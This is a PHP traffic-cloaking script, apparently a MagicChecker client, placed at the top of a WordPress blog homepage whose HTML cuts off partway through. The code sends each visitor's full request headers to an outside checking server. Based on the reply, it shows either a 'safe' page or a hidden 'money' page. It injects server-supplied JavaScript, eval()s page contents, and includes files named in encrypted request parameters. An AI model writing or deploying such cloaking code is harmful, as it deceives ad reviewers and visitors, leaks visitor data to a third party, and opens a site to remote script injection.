<?php
// to view php errors (it can be useful if you got blank screen and there is no clicks in the site statictics) uncomment next two strings:
//error_reporting(E_ALL);
//ini_set('display_errors', 1);

define('CAMPAIGN_ID', "70e9c3faa8e97ae6b390b1f10192dde0");
define('REQUEST_LIVE_TIME', 3600);
define('ENC_KEY', 'befff519c845d9e381b84ff556d33f9e');
define('MP_PARAM_NAME', '_ngsess');
define('NOT_FOUND_TEXT', '<h1>Page not found</h1>');
define('CHECK_MCPROXY', 0);
define('CHECK_MCPROXY_PARAM', 'd3bc538eb4cd542d17dc693290106b31');
define('CHECK_MCPROXY_VALUE', 'bce063f1e9628ec0d86f4ba335daac48fb21670c1560cb06b3967939959e7c00');

function translateCurlError($code) {$output = '';$curl_errors = array(2  => "Can't init curl.",6  => "Can't resolve server's DNS of our domain. Please contact your hosting provider and tell them about this issue.",7  => "Can't connect to the server.",28 => "Operation timeout. Check you DNS setting.");if (isset($curl_errors[$code])) $output = $curl_errors[$code];else $output = "Error code: $code . Check if php cURL library installed and enabled on your server.";return $output;}
function mc_encrypt($encrypt) {$key = ENC_KEY;$encrypt = serialize($encrypt);$iv = mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC), MCRYPT_DEV_URANDOM);$key = pack('H*', $key);$mac = hash_hmac('sha256', $encrypt, substr(bin2hex($key), -32));$passcrypt = mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $encrypt.$mac, MCRYPT_MODE_CBC, $iv);$encoded = base64_encode($passcrypt).'|'.base64_encode($iv);return $encoded;}
function mc_decrypt($decrypt) {$key = ENC_KEY;$decrypt = explode('|', $decrypt.'|');$decoded = base64_decode($decrypt[0]);$iv = base64_decode($decrypt[1]);if(strlen($iv)!==mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC)){ return false; }$key = pack('H*', $key);$decrypted = trim(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, $decoded, MCRYPT_MODE_CBC, $iv));$mac = substr($decrypted, -64);$decrypted = substr($decrypted, 0, -64);$calcmac = hash_hmac('sha256', $decrypted, substr(bin2hex($key), -32));if($calcmac!==$mac){ return false; }$decrypted = unserialize($decrypted);return $decrypted;}

// For PHP 7,7+ use this functions for encript/decript. You neen openssl library installed
//function mc_encrypt($encrypt) {$plaintext = $encrypt;$ivlen = openssl_cipher_iv_length($cipher="AES-128-CBC");$iv = openssl_random_pseudo_bytes($ivlen);$ciphertext_raw = openssl_encrypt($plaintext, $cipher, ENC_KEY, $options=OPENSSL_RAW_DATA, $iv);$hmac = hash_hmac('sha256', $ciphertext_raw, ENC_KEY, $as_binary=true);$ciphertext = base64_encode( $iv.$hmac.$ciphertext_raw );return $ciphertext;}
//function mc_decrypt($decrypt) {$ciphertext = $decrypt;$c = base64_decode($ciphertext);$ivlen = openssl_cipher_iv_length($cipher="AES-128-CBC");$iv = substr($c, 0, $ivlen);$hmac = substr($c, $ivlen, $sha2len=32);$ciphertext_raw = substr($c, $ivlen+$sha2len);$plaintext = openssl_decrypt($ciphertext_raw, $cipher, ENC_KEY, $options=OPENSSL_RAW_DATA, $iv);$calcmac = hash_hmac('sha256', $ciphertext_raw, ENC_KEY, $as_binary=true);if (hash_equals($hmac, $calcmac))return $plaintext;}

function generate_click_id($result) {$p = microtime();$r = md5(str_shuffle(ENC_KEY .$p .CAMPAIGN_ID));$v1 = substr($r, 0, 16);$v2 = substr($r, 16, 31);return array(mc_encrypt($result->click_id.'||'.(($result->moneyUrlType == 'redirect') ? _redirectPage($result->mp, $result->moneySendParams, true) : $result->mp).'||'.(($result->safeUrlType == 'redirect') ? _redirectPage($result->sp, $result->safeSendParams, true) : $result->sp).'||'.time() .'||'.(isset($result->tp) ? $result->tp : 'N') .'||'.(isset($result->mms) ? $result->mms : 'N') .'||'.(isset($result->lls) ? $result->lls : 'N') .'||'.$result->show_first .'||'.$result->hide_script .'||'.($result->moneyUrlType == 'redirect' ? 1 : 2) .'||'.($result->safeUrlType == 'redirect' ? 1 : 2).'||'.$v1.'||'.$v2), $v1, $v2);}
function updateClick($click_id, $data) {sendRequest($data, 'update');}
function rebuildParams($data, $page = 1) {if ((($page == 1) && ($data[9] == 2)) || (($page == 2) && ($data[10] == 2))) {$params = array(time(), $_SERVER['REMOTE_ADDR'], $data[$page]);$encoded = mc_encrypt(implode('||', $params));return $_SERVER['REQUEST_URI'] .((strpos($_SERVER['REQUEST_URI'], '?') !== false ) ? '&' : '?')  .MP_PARAM_NAME .'=' .urlencode($encoded);}return $data[$page];}
function checkCache() {$res = "";$service_port = 8082;$address = "127.0.0.1";$socket = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);if ($socket !== false) {$result = @socket_connect($socket, $address, $service_port);if ($result !== false) {$port = isset($_SERVER['HTTP_X_FORWARDED_REMOTE_PORT']) ? $_SERVER['HTTP_X_FORWARDED_REMOTE_PORT'] : $_SERVER['REMOTE_PORT']; $in = $_SERVER['REMOTE_ADDR'] . ":" . $port . "\n"; socket_write($socket, $in, strlen($in));while ($out = socket_read($socket, 2048)) {$res .= $out;}}} return $res;}

function sendRequest($data, $path = 'index') {
    $headers = array('adapi' => '2.2');
    if ($path == 'index') $data['HTTP_MC_CACHE'] = checkCache(); if (CHECK_MCPROXY || (isset($_GET[CHECK_MCPROXY_PARAM]) && ($_GET[CHECK_MCPROXY_PARAM] == CHECK_MCPROXY_VALUE))) {if (trim($data['HTTP_MC_CACHE'])) {print 'mcproxy is ok';} else {print 'mcproxy error';}die();}
    $data_to_post = array("cmp"=> CAMPAIGN_ID,"headers" => $data,"adapi" => '2.2', "sv" => '14618.3');
    
    $ch = curl_init("http://check.magicchecker.com/v2.2/" .$path .'.php');
    curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 120);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data_to_post));
    $output = curl_exec($ch);    
    $info = curl_getinfo($ch);
    
    if ((strlen($output) == 0) || ($info['http_code'] != 200)) {
        $curl_err_num = curl_errno($ch);
        curl_close($ch);
        
        if ($curl_err_num != 0) {
            header($_SERVER['SERVER_PROTOCOL'] .' 503 Service Unavailable');           
            print 'cURL error ' .$curl_err_num .': ' .translateCurlError($curl_err_num);
        }    
        else {
                if ($info['http_code'] == 500) {
                    header($_SERVER['SERVER_PROTOCOL'] .' 503 Service Unavailable');
                    print '<h1>503 Service Unavailable</h1>';
                }    
                else {
                    header($_SERVER['SERVER_PROTOCOL'] .' ' .$info['http_code']);
                    print '<h1>Error ' .$info['http_code'] .'</h1>';
                }
        }    
        die();
    }    
    curl_close($ch); 
    return $output;
}

function isBlocked($testmode = false) {
    $result = new stdClass();
    $result->hasResponce = false;
    $result->isBlocked = false;
    $result->errorMessage = '';
    $data_headers = array();
    
    foreach ( $_SERVER as $name => $value ) {
        if (is_array($value)) {
            $value = implode(', ', $value);
        }
        if ((strlen($value) < 1024) || ($name == 'HTTP_REFERER') || ($name == 'QUERY_STRING') || ($name == 'REQUEST_URI') || ($name == 'HTTP_USER_AGENT')) {
            $data_headers[$name] = $value;
        } else {
            $data_headers[$name] = 'TRIMMED: ' .substr($value, 0, 1024);
        }
    }    
    
    $output = sendRequest($data_headers);
    if ($output) {
        $result->hasResponce = true;
        $answer = json_decode($output, TRUE);
        if (isset($answer['ban']) && ($answer['ban'] == 1)) die();
        
        if ($answer['success'] == 1) {
            foreach ($answer as $ak => $av) {
                $result->{$ak} = $av;
            }
        }
        else {
            $result->errorMessage = $answer['errorMessage'];
        }
    }
    return $result;
}

function _redirectPage($url, $send_params, $return_url = false) {
    if ($send_params) {
        if ($_SERVER['QUERY_STRING'] != '') {
            if (strpos($url, '?') === false) {
                    $url .= '?' . $_SERVER['QUERY_STRING'];
            } else {
                    $url .= '&' . $_SERVER['QUERY_STRING'];
            }
        }
    } 

    if ($return_url) return $url;
    else header("Location: $url", true, 302);
}

function _includeFileName($url) {
    if (strpos($url, '/') !== false) {
        $url = ltrim(strrchr($url, '/'), '/');
    }      
    if (strpos($url, '?') !== false) {
        $url = explode('?', $url);
        $url = $url[0];
    }
    return $url;
}

//////////////////////////////////////////////////////////////////////////////// 

if (!isset($_POST['click'])) {
    if (isset($_GET[MP_PARAM_NAME])) {
        $encdata = mc_decrypt($_GET[MP_PARAM_NAME]);
        $show_404 = true;
        if (strpos($encdata, '||') !== false) {
            $cdata = explode('||', $encdata);
            if ((sizeof($cdata) == 3) && ($cdata[0] + REQUEST_LIVE_TIME >= time()) && ($_SERVER['REMOTE_ADDR'] == $cdata[1])) {
                include(_includeFileName($cdata[2]));
                $show_404 = false;
            }
        }    
        if ($show_404) {
            $protocol = $_SERVER['SERVER_PROTOCOL'] ? $_SERVER['SERVER_PROTOCOL'] : 'HTTP/1.1';
            header($protocol ." 404 Not Found");
            print NOT_FOUND_TEXT;
            die();             
        }
    }
    else {
        $result = isBlocked();
        if ($result->hasResponce && !isset($result->error_message)) {
            if (!$result->isBlocked && isset($result->js)) {
                $clickdata = generate_click_id($result);
                $insert_script = '<noscript><style>html,body{visibility:hidden;background-color:#ffffff!important;}</style><meta http-equiv="refresh" content="0; url=' ._redirectPage($result->sp, $result->safeUrlType, true) .'"></noscript><script type="text/javascript">window.click_id="' .$clickdata[0] .'";window.qt14="' .$clickdata[1] .'";window.fh76="' .$clickdata[2] .'";' .$result->js .'</script>';
                if (($result->show_first == 1) && ($result->safeUrlType == 'redirect') || 
                    ($result->show_first == 2) && ($result->moneyUrlType == 'redirect')) {
                    print '<html><head><title></title><meta charset="UTF-8">' .$insert_script .'</head><body></body></html>';
                }
                else {
                    $include_file = ($result->show_first == 1) ? $result->sp : $result->mp;
                    $include_file = file_get_contents(dirname(__FILE__) .'/' ._includeFileName($include_file));
                    if (strpos($include_file, '<head>') !== false) {
                        $include_file = str_ireplace('<head>', '<head>' .$insert_script, $include_file);
                    }
                    else {
                        $include_file = str_ireplace('<body', '<head>' .$insert_script .'</head><body', $include_file);
                    }
                    if (strpos($include_file, '<?') !== false) {
                        eval('?>'.$include_file .'<?php ');
                    }
                    else {
                        print $include_file;
                    }
                }
            }
            else {
                if ($result->urlType == 'redirect') {
                    _redirectPage($result->url, $result->send_params);       
                }
                else {
                    include _includeFileName($result->url);
                }
            }   
        }
        else {
            die('Error: ' .$result->errorMessage);
        }  
    }    
}
else {
    $click_id = mc_decrypt($_POST['click']);
    if (strpos($click_id, '||') !== false) {
        $cdata = explode('||', $click_id);
        if ($cdata[3] + REQUEST_LIVE_TIME >= time()) {
            $update_data = array();
            $tp = isset($_POST['tp']) ? trim($_POST['tp']) : null;
            $plr = isset($_POST['plr']) ? trim($_POST['plr']) : null;
            $lls = isset($_POST['lls']) ? (int)$_POST['lls'] : null;
            if (($cdata[5] != 'N') && ($plr != $cdata[12])) $update_data['r'] = 'pn';
            else if (($cdata[6] != 'N') && ($lls == 1))   $update_data['r'] = 'lls';
            else {
                if ($tp && ($cdata[4] != 'N') && ($cdata[4])) {
                    $tpz = explode('&', $cdata[4]);
                    if (!(($tp >= $tpz[0]) && ($tp <= $tpz[1])) ) {$update_data['r'] = 'tp';}
                }
            }

            if (isset($update_data['r'])) {
                $update_data['click_id'] = $cdata[0];
                if ($tp) $update_data['tp'] = $tp;
                if (isset($_POST['pn'])) $update_data['pn'] = $_POST['pn'];
                if (isset($_POST['or'])) $update_data['or'] = $_POST['or'];
                if (isset($_POST['rn'])) $update_data['rn'] = $_POST['rn'];
                updateClick($click_id, $update_data);                
                
                if (($cdata[10] == 1) || (($cdata[10] == 2) && (($cdata[7] == 2) || (($cdata[7] == 1) && $cdata[8])))) {
                    print "<script>location.href=\"" .rebuildParams($cdata, 2) ."\";</script>";
                }
            }
            else {
                if (($cdata[9] == 1) || (($cdata[9] == 2) && (($cdata[7] == 1) || (($cdata[7] == 2) && $cdata[8])))) {
                    print "<script>location.href=\"" .rebuildParams($cdata) ."\";</script>";
                }    
            }
        }
        else {
            if (($cdata[10] == 1) || (($cdata[10] == 2) && (($cdata[7] == 2) || (($cdata[7] == 1) && $cdata[8])))) {
                print "<script>location.href=\"" .rebuildParams($cdata, 2) ."\";</script>";
            }
        }
    }
}
<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<title>Power &#8211; utilize rich relationships</title>
<meta name='robots' content='max-image-preview:large' />

<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Power &raquo; Feed" href="feed" />
<link rel="alternate" type="application/rss+xml" title="Power &raquo; Comments Feed" href="comments/feed" />
<script type="text/javascript">
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.0"}};
/*! This file is auto-generated */
!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode,e=(p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0),i.toDataURL());return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([129777,127995,8205,129778,127999],[129777,127995,8203,129778,127999])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(e=t.source||{}).concatemoji?c(e.concatemoji):e.wpemoji&&e.twemoji&&(c(e.twemoji),c(e.wpemoji)))}(window,document,window._wpemojiSettings);
</script>
<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 0.07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel='stylesheet' id='wp-block-library-css'  href='wp-includes/css/dist/block-library/style.min.css?ver=6.0' type='text/css' media='all' />
<style id='global-styles-inline-css' type='text/css'>
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
</style>
<link rel='stylesheet' id='newsup-fonts-css'  href='//fonts.googleapis.com/css?family=Montserrat%3A400%2C500%2C700%2C800%7CWork%2BSans%3A300%2C400%2C500%2C600%2C700%2C800%2C900%26display%3Dswap&#038;subset=latin%2Clatin-ext' type='text/css' media='all' />
<link rel='stylesheet' id='bootstrap-css'  href='wp-content/themes/newsup/css/bootstrap.css?ver=6.0' type='text/css' media='all' />
<link rel='stylesheet' id='newsup-style-css'  href='wp-content/themes/newsup/style.css?ver=6.0' type='text/css' media='all' />
<link rel='stylesheet' id='newsup-default-css'  href='wp-content/themes/newsup/css/colors/default.css?ver=6.0' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-5-all-css'  href='wp-content/themes/newsup/css/font-awesome/css/all.min.css?ver=6.0' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-4-shim-css'  href='wp-content/themes/newsup/css/font-awesome/css/v4-shims.min.css?ver=6.0' type='text/css' media='all' />
<link rel='stylesheet' id='owl-carousel-css'  href='wp-content/themes/newsup/css/owl.carousel.css?ver=6.0' type='text/css' media='all' />
<link rel='stylesheet' id='smartmenus-css'  href='wp-content/themes/newsup/css/jquery.smartmenus.bootstrap.css?ver=6.0' type='text/css' media='all' />
<script type='text/javascript' src='wp-includes/js/jquery/jquery.min.js?ver=3.6.0' id='jquery-core-js'></script>
<script type='text/javascript' src='wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2' id='jquery-migrate-js'></script>
<script type='text/javascript' src='wp-content/themes/newsup/js/navigation.js?ver=6.0' id='newsup-navigation-js'></script>
<script type='text/javascript' src='wp-content/themes/newsup/js/bootstrap.js?ver=6.0' id='bootstrap-js'></script>
<script type='text/javascript' src='wp-content/themes/newsup/js/owl.carousel.min.js?ver=6.0' id='owl-carousel-min-js'></script>
<script type='text/javascript' src='wp-content/themes/newsup/js/jquery.smartmenus.js?ver=6.0' id='smartmenus-js-js'></script>
<script type='text/javascript' src='wp-content/themes/newsup/js/jquery.smartmenus.bootstrap.js?ver=6.0' id='bootstrap-smartmenus-js-js'></script>
<script type='text/javascript' src='wp-content/themes/newsup/js/jquery.marquee.js?ver=6.0' id='newsup-marquee-js-js'></script>
<script type='text/javascript' src='wp-content/themes/newsup/js/main.js?ver=6.0' id='newsup-main-js-js'></script>
<link rel="https://api.w.org/" href="wp-json/" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 6.0" />
          <meta name="keywords" content="the, perfect, gift"/>
          <style type="text/css" id="custom-background-css">
    .wrapper { background-color: #eee; }
</style>
    <style type="text/css">
            body .site-title a,
        body .site-description {
            color: #fff;
        }

        .site-branding-text .site-title a {
                font-size: px;
            }

            @media only screen and (max-width: 640px) {
                .site-branding-text .site-title a {
                    font-size: 40px;

                }
            }

            @media only screen and (max-width: 375px) {
                .site-branding-text .site-title a {
                    font-size: 32px;

                }
            }

        </style>
    </head>
<body class="home blog wp-embed-responsive hfeed  ta-hide-date-author-in-list" >
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-dark-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 0.49803921568627" /><feFuncG type="table" tableValues="0 0.49803921568627" /><feFuncB type="table" tableValues="0 0.49803921568627" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 1" /><feFuncG type="table" tableValues="0 1" /><feFuncB type="table" tableValues="0 1" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-purple-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.54901960784314 0.98823529411765" /><feFuncG type="table" tableValues="0 1" /><feFuncB type="table" tableValues="0.71764705882353 0.25490196078431" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-blue-red"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 1" /><feFuncG type="table" tableValues="0 0.27843137254902" /><feFuncB type="table" tableValues="0.5921568627451 0.27843137254902" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-midnight"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 0" /><feFuncG type="table" tableValues="0 0.64705882352941" /><feFuncB type="table" tableValues="0 1" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg 